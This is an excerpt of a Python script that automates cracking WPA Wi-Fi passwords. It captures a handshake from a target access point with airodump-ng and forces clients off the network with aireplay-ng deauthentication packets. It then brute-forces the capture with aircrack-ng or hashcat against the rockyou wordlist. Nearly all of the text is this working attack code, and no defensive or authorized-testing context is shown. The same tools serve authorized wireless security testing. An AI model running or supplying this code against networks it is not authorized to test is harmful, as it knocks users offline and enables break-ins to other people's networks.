...
def capture_handshake(mon_iface, bssid, channel, output_prefix="/tmp/handshake", timeout=120):
    """Capture WPA handshake from target network."""
    proc = subprocess.Popen(
        ["airodump-ng", "-c", str(channel), "--bssid", bssid, "-w", output_prefix, mon_iface],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    time.sleep(5)
    subprocess.run(
        ["aireplay-ng", "-0", "5", "-a", bssid, mon_iface], capture_output=True, timeout=30
    )
    time.sleep(timeout)
    proc.send_signal(signal.SIGINT)
    proc.wait()
...
def crack_with_aircrack(cap_file, wordlist="/usr/share/wordlists/rockyou.txt"):
    ...
    result = subprocess.run(
        ["aircrack-ng", cap_file, "-w", wordlist], capture_output=True, text=True, timeout=3600
    )
...
def crack_with_hashcat(hash_file, wordlist="/usr/share/wordlists/rockyou.txt", hash_mode=22000):
